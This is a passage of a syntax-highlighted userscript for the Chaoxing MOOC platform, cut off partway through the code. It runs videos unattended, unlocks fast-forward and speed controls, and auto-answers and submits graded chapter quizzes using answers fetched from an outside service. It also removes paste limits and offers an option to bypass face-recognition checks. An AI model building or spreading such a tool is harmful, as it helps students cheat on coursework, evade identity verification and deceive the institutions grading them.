class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         超星网课助手</span></span><br><span class="line"><span class="comment">// @namespace    wyn665817@163.com</span></span><br><span class="line"><span class="comment">// @version      2.1.0</span></span><br><span class="line"><span class="comment">// @description  自动挂机看尔雅MOOC，支持后台、切换窗口不暂停，视频自动切换，屏蔽视频内的题目，倍速播放、进度条拖动、快进快退</span></span><br><span class="line"><span class="comment">// @author       wyn665817</span></span><br><span class="line"><span class="comment">// @match        *://*.chaoxing.com/*</span></span><br><span class="line"><span class="comment">// @require      https://greasyfork.org/scripts/18715/code/Hooks.js?version=661566</span></span><br><span class="line"><span class="comment">// @connect      forestpolice.org</span></span><br><span class="line"><span class="comment">// @run-at       document-end</span></span><br><span class="line"><span class="comment">// @grant        unsafeWindow</span></span><br><span class="line"><span class="comment">// @grant        GM_xmlhttpRequest</span></span><br><span class="line"><span class="comment">// @grant        GM_setClipboard</span></span><br><span class="line"><span class="comment">// @supportURL   https://greasyfork.org/zh-CN/scripts/369625/feedback</span></span><br><span class="line"><span class="comment">// @license      MIT</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置修改后，需要刷新或重新打开网课页面才会生效</span></span><br><span class="line"><span class="keyword">var</span> setting = &#123;</span><br><span class="line">    <span class="comment">// 5E3 == 5000，科学记数法，表示毫秒数</span></span><br><span class="line">    time: <span class="number">5E3</span> <span class="comment">// 默认响应速度为5秒，不建议小于3秒</span></span><br><span class="line">    ,<span class="attr">token</span>: <span class="string">''</span> <span class="comment">// 捐助用户可以使用上传选项功能，更精准的匹配答案，此处填写捐助后获取的识别码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1代表开启，0代表关闭</span></span><br><span class="line">    ,<span class="attr">video</span>: <span class="number">1</span> <span class="comment">// 视频支持后台、切换窗口不暂停，支持多视频，默认开启</span></span><br><span class="line">    ,<span class="attr">work</span>: <span class="number">1</span> <span class="comment">// 自动答题功能(章节测验)，高准确率，默认开启</span></span><br><span class="line">    ,<span class="attr">jump</span>: <span class="number">1</span> <span class="comment">// 自动切换任务点、章节、课程(需要配置course参数)，默认开启</span></span><br><span class="line">    ,<span class="attr">face</span>: <span class="number">0</span> <span class="comment">// 解除面部识别，此功能仅为临时解除，可能会导致不良记录(慎用)，默认关闭</span></span><br><span class="line">    ,<span class="attr">login</span>: <span class="number">0</span> <span class="comment">// 自动登录，支持监测掉线并自动重连，需要配置详细参数，默认关闭</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅开启video时，修改此处才会生效</span></span><br><span class="line">    ,<span class="attr">line</span>: <span class="string">'公网1'</span> <span class="comment">// 视频播放的默认资源线路，此功能适用于系统默认线路无资源，默认'公网1'</span></span><br><span class="line">    ,<span class="attr">http</span>: <span class="string">''</span> <span class="comment">// 视频播放的默认清晰度，可以设置'标清'等，无参数则使用系统默认清晰度，默认''</span></span><br><span class="line">    ,<span class="attr">muted</span>: <span class="number">0</span> <span class="comment">// 视频静音播放，此功能在视频开始播放时调整音量至静音，默认关闭</span></span><br><span class="line">    ,<span class="attr">drag</span>: <span class="number">0</span> <span class="comment">// 倍速播放、进度条拖动、快进快退，使用此功能会出现不良记录(慎用)，默认关闭</span></span><br><span class="line">    ,<span class="attr">player</span>: <span class="string">''</span> <span class="comment">// 指定播放器的类型，支持'html5'和'flash'两种参数，其他参数代表系统默认播放器，默认''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅开启work时，修改此处才会生效</span></span><br><span class="line">    ,<span class="attr">auto</span>: <span class="number">1</span> <span class="comment">// 答题完成后自动提交，默认开启</span></span><br><span class="line">    ,<span class="attr">none</span>: <span class="number">1</span> <span class="comment">// 无匹配答案时执行默认操作，关闭后若题目无匹配答案则会停止本次自动提交，默认开启</span></span><br><span class="line">    ,<span class="attr">wait</span>: <span class="number">5E3</span> <span class="comment">// 自动提交前的等待时间，用于更改自动答题的提交间隔，默认5秒</span></span><br><span class="line">    ,<span class="attr">paste</span>: <span class="number">1</span> <span class="comment">// 文本编辑器允许粘贴，用于解除文本类题目的粘贴限制，默认开启</span></span><br><span class="line">    ,<span class="attr">scale</span>: <span class="number">0</span> <span class="comment">// 富文本编辑器高度自动拉伸，用于文本类题目，答题框根据内容自动调整大小，默认关闭</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅开启jump时，修改此处才会生效</span></span><br><span class="line">    ,<span class="attr">check</span>: <span class="number">1</span> <span class="comment">// 任务点无法自动完成时暂停切换，如果网课已全部解锁的建议关闭，默认开启</span></span><br><span class="line">    ,<span class="attr">course</span>: <span class="number">0</span> <span class="comment">// 当前课程完成后自动切换课程，仅支持按照根目录课程顺序切换，建议同时配置check参数为0，默认关闭</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅开启login时，修改此处才会生效，且必须设置以下参数</span></span><br><span class="line">    ,<span class="attr">school</span>: <span class="string">''</span> <span class="comment">// 学校名称，要求完整有效可查询，例如'清华大学'，默认''</span></span><br><span class="line">    ,<span class="attr">username</span>: <span class="string">''</span> <span class="comment">// 学号/工号/借书证号(邮箱/手机号/账号)，例如'2018010101'，默认''</span></span><br><span class="line">    ,<span class="attr">password</span>: <span class="string">''</span> <span class="comment">// 密码，例如'123456'，默认''</span></span><br><span class="line">&#125;,</span><br><span class="line">_self = unsafeWindow,</span><br><span class="line">top = _self.top,</span><br><span class="line">$ = _self.$ || top.$,</span><br><span class="line">Hooks = Hooks || <span class="built_in">window</span>.Hooks,</span><br><span class="line">UE = _self.UE,</span><br><span class="line">url = location.pathname;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (url == <span class="string">'/ananas/modules/video/index.html'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (setting.video) &#123;</span><br><span class="line">        jobSort();</span><br><span class="line">        checkPlayer();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        getIframe(<span class="number">0</span>).remove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (url == <span class="string">'/work/doHomeWorkNew'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!_self.$) &#123;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (setting.work &amp;&amp; $(<span class="string">'.Btn_blue_1'</span>).length) &#123;</span><br><span class="line">        jobSort();</span><br><span class="line">        setTimeout(relieveLimit, setting.time / <span class="number">2</span>);</span><br><span class="line">        beforeFind();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        getIframe(<span class="number">0</span>).remove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (url == <span class="string">'/knowledge/cards'</span>) &#123;</span><br><span class="line">    checkToNext();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (url == <span class="string">'/mycourse/studentcourse'</span>) &#123;</span><br><span class="line">    goCourse();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (url == <span class="string">'/visit/courses'</span>) &#123;</span><br><span class="line">    setting.face &amp;&amp; DisplayURL();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (location.host.indexOf(<span class="string">'passport2'</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    setting.login &amp;&amp; getSchoolId();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIframe</span>(<span class="params">tip, win, job</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        win = win ? win.parent : _self;</span><br><span class="line">        job = $(win.frameElement).prev(<span class="string">'.ans-job-icon'</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (!job.length &amp;&amp; win.parent.frameElement);</span><br><span class="line">    <span class="keyword">return</span> tip ? win : job;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jobSort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> win = getIframe(<span class="number">1</span>),</span><br><span class="line">    $job = $(<span class="string">'.ans-job-icon'</span>, win.parent.document).next(<span class="string">'iframe[src*="/video/index.html"], iframe[src*="/work/index.html"]'</span>).not(<span class="string">'.ans-job-finished &gt; iframe'</span>);</span><br><span class="line">    setting.tip = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!$job.length) &#123;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($job[<span class="number">0</span>] == win.frameElement) &#123;</span><br><span class="line">        setting.tip = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($job.filter(<span class="string">'.ans-job-icon + iframe'</span>).not(<span class="string">'.ans-job-finished &gt; iframe'</span>)[<span class="number">0</span>] == win.frameElement) &#123;</span><br><span class="line">                location.reload();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, setting.time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPlayer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> data = $.parseJSON($(frameElement).attr(<span class="string">'data'</span>)),</span><br><span class="line">    danmaku = data &amp;&amp; data.danmaku ? data.danmaku : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (setting.player == <span class="string">'flash'</span>) &#123;</span><br><span class="line">        _self.showHTML5Player = _self.showMoocPlayer;</span><br><span class="line">        danmaku = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (setting.player == <span class="string">'html5'</span>) &#123;</span><br><span class="line">        _self.showMoocPlayer = _self.showHTML5Player;</span><br><span class="line">        danmaku = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!danmaku &amp;&amp; _self.supportH5Video() &amp;&amp; !navigator.userAgent.match(<span class="regexp">/metasr/i</span>)) &#123;</span><br><span class="line">        hookVideo(_self.videojs, _self.videojs.xhr);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_self.flashChecker().hasFlash) &#123;</span><br><span class="line">        hookJQuery();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">"此浏览器不支持flash，请修改脚本player参数为'html5'，或者更换浏览器"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookVideo</span>(<span class="params">Hooks, xhr</span>) </span>&#123;</span><br><span class="line">    _self.videojs = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> config = <span class="built_in">arguments</span>[<span class="number">1</span>],</span><br><span class="line">        line = $.grep($.map(config.playlines, <span class="function"><span class="keyword">function</span>(<span class="params">value, index</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> value.label == setting.line &amp;&amp; index;</span><br><span class="line">        &#125;), <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $.isNumeric(value);</span><br><span class="line">        &#125;)[<span class="number">0</span>] || <span class="number">0</span>,</span><br><span class="line">        http = $.grep(config.sources, <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> value.label == setting.http;</span><br><span class="line">        &#125;)[<span class="number">0</span>];</span><br><span class="line">        config.playlines.unshift(config.playlines[line]);</span><br><span class="line">        config.playlines.splice(line + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        config.plugins.videoJsResolutionSwitcher.default = http ? http.res : <span class="number">360</span>;</span><br><span class="line">        config.plugins.studyControl.enableSwitchWindow = <span class="number">1</span>;</span><br><span class="line">        config.plugins.timelineObjects.url = <span class="string">'/richvideo/initdatawithviewer?'</span>;</span><br><span class="line">        <span class="keyword">if</span> (setting.drag) &#123;</span><br><span class="line">            config.plugins.seekBarControl.enableFastForward = <span class="number">1</span>;</span><br><span class="line">            config.playbackRates = [<span class="number">1</span>, <span class="number">1.25</span>, <span class="number">1.5</span>, <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> player = Hooks.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">        player.children_[<span class="number">0</span>].muted = setting.muted;</span><br><span class="line">        player.on(<span class="string">'loadstart'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            setting.tip &amp;&amp; <span class="keyword">this</span>.play().catch(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">        _self.videojs = Hooks;</span><br><span class="line">        _self.videojs.xhr = setting.login ? <span class="function"><span class="keyword">function</span>(<span class="params">options, callback</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> xhr.call(<span class="keyword">this</span>, options, <span class="function"><span class="keyword">function</span>(<span class="params">error, response</span>) </span>&#123;</span><br><span class="line">                response.statusCode || top.location.reload();</span><br><span class="line">                <span class="keyword">return</span> callback.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; : xhr;</span><br><span class="line">        <span class="keyword">return</span> player;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookJQuery</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Hooks.set(_self, <span class="string">'jQuery'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">target, propertyName, ignored, jQuery</span>) </span>&#123;</span><br><span class="line">        Hooks.method(jQuery.fn, <span class="string">'cxplayer'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">target, methodName, method, thisArg, args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> config = args[<span class="number">0</span>];</span><br><span class="line">            config.datas.isDefaultPlay = setting.tip;</span><br><span class="line">            config.enableSwitchWindow = <span class="number">1</span>;</span><br><span class="line">            config.datas.currVideoInfo.resourceUrl = <span class="string">'/richvideo/initdatawithviewer?'</span>;</span><br><span class="line">            config.datas.currVideoInfo.dftLineIndex = $.grep($.map(<span class="built_in">decodeURIComponent</span>(config.datas.currVideoInfo.getVideoUrl).match(<span class="regexp">/&#123;.+?&#125;/g</span>) || [], <span class="function"><span class="keyword">function</span>(<span class="params">value, index</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> value.indexOf(setting.line + setting.http) &gt; <span class="number">-1</span> &amp;&amp; index;</span><br><span class="line">            &#125;), <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $.isNumeric(value);</span><br><span class="line">            &#125;)[<span class="number">0</span>] || <span class="number">0</span>;</span><br><span class="line">            setting.drag &amp;&amp; (config.datas.currVideoInfo.getVideoUrl = config.datas.currVideoInfo.getVideoUrl.replace(<span class="regexp">/&amp;drag=false&amp;/</span>, <span class="string">'&amp;drag=true&amp;'</span>));</span><br><span class="line">            <span class="keyword">var</span> $player = Hooks.Reply.method(<span class="built_in">arguments</span>);</span><br><span class="line">            setting.muted &amp;&amp; $player.one(<span class="string">'onStart'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">                    $player.addVolNum(<span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">return</span> $player;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> Hooks.Reply.set(<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">relieveLimit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    UE &amp;&amp; setting.scale &amp;&amp; (_self.UEDITOR_CONFIG.scaleEnabled = <span class="literal">false</span>);</span><br><span class="line">    UE &amp;&amp; $(<span class="string">'.edui-default + textarea'</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        UE.getEditor($(<span class="keyword">this</span>).attr(<span class="string">'name'</span>)).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.autoHeightEnabled = <span class="literal">true</span>;</span><br><span class="line">            setting.scale &amp;&amp; <span class="keyword">this</span>.enableAutoHeight();</span><br><span class="line">            setting.paste &amp;&amp; <span class="keyword">this</span>.removeListener(<span class="string">'beforepaste'</span>, _self.myEditor_paste);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">if</span> (!setting.paste) <span class="keyword">return</span>;</span><br><span class="line">    $(<span class="string">'input[onpaste]'</span>).removeAttr(<span class="string">'onpaste'</span>);</span><br><span class="line">    _self.myEditor_paste = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    <span class="comment">// _self.pasteText = function() &#123;return true&#125;;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">beforeFind</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setting.div = $(</span><br><span class="line">        <span class="string">'&lt;div style="border: 2px dashed rgb(0, 85, 68); width: 330px; position: fixed; top: 0; right: 0; z-index: 99999; background-color: rgba(70, 196, 38, 0.6); overflow-x: auto;"&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;span style="font-size: medium;"&gt;&lt;/span&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;div style="font-size: medium;"&gt;正在搜索答案...&lt;/div&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;button style="margin-right: 10px;"&gt;暂停答题&lt;/button&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;button style="margin-right: 10px;"&gt;'</span> + (setting.auto ? <span class="string">'取消本次自动提交'</span> : <span class="string">'开启本次自动提交'</span>) + <span class="string">'&lt;/button&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;button style="margin-right: 10px;"&gt;重新查询&lt;/button&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;button&gt;折叠面板&lt;/button&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;div style="max-height: 300px; overflow-y: auto;"&gt;'</span> +</span><br><span class="line">                <span class="string">'&lt;table border="1" style="font-size: 12px;"&gt;'</span> +</span><br><span class="line">                    <span class="string">'&lt;thead&gt;'</span> +</span><br><span class="line">                        <span class="string">'&lt;tr&gt;'</span> +</span><br><span class="line">                            <span class="string">'&lt;th style="width: 60%; min-width: 130px;"&gt;题目&lt;/th&gt;'</span> +</span><br><span class="line">                            <span class="string">'&lt;th style="min-width: 130px;"&gt;答案&lt;/th&gt;'</span> +</span><br><span class="line">                        <span class="string">'&lt;/tr&gt;'</span> +</span><br><span class="line">                    <span class="string">'&lt;/thead&gt;'</span> +</span><br><span class="line">                    <span class="string">'&lt;tfoot style="display: none;"&gt;'</span> +</span><br><span class="line">                        <span class="string">'&lt;tr&gt;'</span> +</span><br><span class="line">                            <span class="string">'&lt;th colspan="2"&gt;答案提示框 已折叠&lt;/th&gt;'</span> +</span><br><span class="line">                        <span class="string">'&lt;/tr&gt;'</span> +</span><br><span class="line">                    <span class="string">'&lt;/tfoot&gt;'</span> +</span><br><span class="line">                    <span class="string">'&lt;tbody&gt;'</span> +</span><br><span class="line">                        <span class="string">'&lt;tr&gt;'</span> +</span><br><span class="line">                            <span class="string">'&lt;td colspan="2" style="display: none;"&gt;&lt;/td&gt;'</span> +</span><br><span class="line">                        <span class="string">'&lt;/tr&gt;'</span> +</span><br><span class="line">                    <span class="string">'&lt;/tbody&gt;'</span> +</span><br><span class="line">                <span class="string">'&lt;/table&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;/div&gt;'</span> +</span><br><span class="line">        <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">    ).appendTo(<span class="string">'body'</span>).on(<span class="string">'click'</span>, <span class="string">'button, td'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> len = $(<span class="keyword">this</span>).prevAll(<span class="string">'button'</span>).length;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.tagName == <span class="string">'TD'</span>) &#123;</span><br><span class="line">            GM_setClipboard($(<span class="keyword">this</span>).text());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (setting.loop) &#123;</span><br><span class="line">                clearInterval(setting.loop);</span><br><span class="line">                <span class="keyword">delete</span> setting.loop;</span><br><span class="line">                setting.div.children(<span class="string">'div:eq(0)'</span>).text(<span class="string">'已暂停搜索'</span>);</span><br><span class="line">                $(<span class="keyword">this</span>).text(<span class="string">'继续答题'</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                setting.loop = setInterval(findAnswer, setting.time);</span><br><span class="line">                setting.div.children(<span class="string">'div:eq(0)'</span>).text(<span class="string">'正在搜索答案...'</span>);</span><br><span class="line">                $(<span class="keyword">this</span>).text(<span class="string">'暂停答题'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">1</span>) &#123;</span><br><span class="line">            setting.auto = <span class="number">1</span> ^ setting.auto;</span><br><span class="line">            $(<span class="keyword">this</span>).text(setting.auto ? <span class="string">'取消本次自动提交'</span> : <span class="string">'开启本次自动提交'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">2</span>) &#123;</span><br><span class="line">            location.reload();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">3</span>) &#123;</span><br><span class="line">            setting.div.find(<span class="string">'tbody, tfoot'</span>).toggle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    setting.lose = setting.num = <span class="number">0</span>;</span><br><span class="line">    setting.curs = $(<span class="string">'h1'</span>).text().trim() || $(<span class="string">'script:contains(courseName)'</span>, top.document).text().match(<span class="regexp">/courseName:\'(.+?)\'/</span>)[<span class="number">1</span>];</span><br><span class="line">    setting.loop = setInterval(findAnswer, setting.time);</span><br><span class="line">    setting.tip || setting.div.children(<span class="string">'button'</span>).eq(<span class="number">0</span>).click();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findAnswer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (setting.num &gt;= $(<span class="string">'.TiMu'</span>).length) &#123;</span><br><span class="line">        clearInterval(setting.loop);</span><br><span class="line">        <span class="keyword">var</span> text = <span class="string">'答题已完成'</span>;</span><br><span class="line">        <span class="keyword">if</span> (setting.lose) &#123;</span><br><span class="line">            setting.div.children(<span class="string">'button'</span>).eq(<span class="number">1</span>).hide();</span><br><span class="line">            text = <span class="string">'共有 &lt;font color="red"&gt;'</span> + setting.lose + <span class="string">'&lt;/font&gt; 道题目待完善（已深色标注）'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setTimeout(submitThis, setting.wait);</span><br><span class="line">        &#125;</span><br><span class="line">        setting.div.children(<span class="string">'button'</span>).eq(<span class="number">0</span>).hide();</span><br><span class="line">        setting.div.children(<span class="string">'div:eq(0)'</span>).html(text);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> $TiMu = $(<span class="string">'.TiMu'</span>).eq(setting.num),</span><br><span class="line">    question = $TiMu.find(<span class="string">'.Zy_TItle .clearfix:eq(0)'</span>).text().trim(),</span><br><span class="line">    type = $TiMu.find(<span class="string">'input[name^=answertype]:eq(0)'</span>).val(),</span><br><span class="line">    option = setting.token &amp;&amp; $TiMu.find(<span class="string">'.clearfix ul:eq(0) li .after'</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $(<span class="keyword">this</span>).text().trim();</span><br><span class="line">    &#125;).filter(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.length;</span><br><span 